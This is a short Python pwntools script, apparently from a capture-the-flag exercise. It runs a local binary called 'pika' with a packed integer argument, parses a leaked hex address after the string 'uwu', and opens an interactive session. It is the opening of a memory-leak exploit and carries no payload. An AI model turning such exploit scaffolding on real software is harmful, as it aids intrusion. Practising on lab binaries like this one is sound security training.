from pwn import *

argv1 = p32(0x4d2)

r = process(argv=['./pika', argv1])

r.recvuntil('uwu')
leak = int(r.recv(), 16)
print hex(leak)

r.interactive()